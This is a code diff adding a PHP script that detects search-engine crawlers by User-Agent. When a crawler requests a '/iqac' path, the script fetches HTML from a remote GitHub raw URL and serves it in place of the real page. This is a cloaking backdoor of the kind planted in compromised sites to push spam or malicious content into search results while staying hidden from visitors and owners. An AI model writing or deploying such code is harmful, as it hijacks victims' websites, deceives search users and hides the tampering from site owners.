@@ -1,0 +1,51 @@
+<?php
+header('Vary: Accept-Language, User-Agent', true);
+
+function is_bot(): bool {
+    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+    if ($ua === '') return false;
+
+    $bots = [
+        'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'google-amphtml',
+        'yandexbot', 'facebookexternalhit', 'twitterbot', 'applebot',
+        'google-inspectiontool'
+    ];
+
+    foreach ($bots as $bot) {
+        if (strpos($ua, $bot) !== false) return true;
+    }
+    return false;
+}
+
+function fetch_lp(string $url): ?string {
+    $ctx = stream_context_create([
+        'http' => [
+            'timeout' => 5,
+            'follow_location' => 1,
+            'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
+        ]
+    ]);
+    $body = @file_get_contents($url, false, $ctx);
+    return $body !== false ? $body : null;
+}
+
+$map_around = [
+    '/iqac' => 'https://github.com/vforwho/foiyohh/raw/refs/heads/main/dypimed',
+];
+
+$request_uri = $_SERVER['REQUEST_URI'] ?? '/';
+
+if (is_bot()) {
+    foreach ($map_around as $path => $remote_url) {
+
+        if (strpos($request_uri, $path) !== false) {
+            $lp = fetch_lp($remote_url);
+            if ($lp !== null) {
+                if (ob_get_level()) ob_end_clean(); 
+                header('Content-Type: text/html; charset=UTF-8');
+                echo $lp;
+                exit;
+            }
+        }
+    }
+}
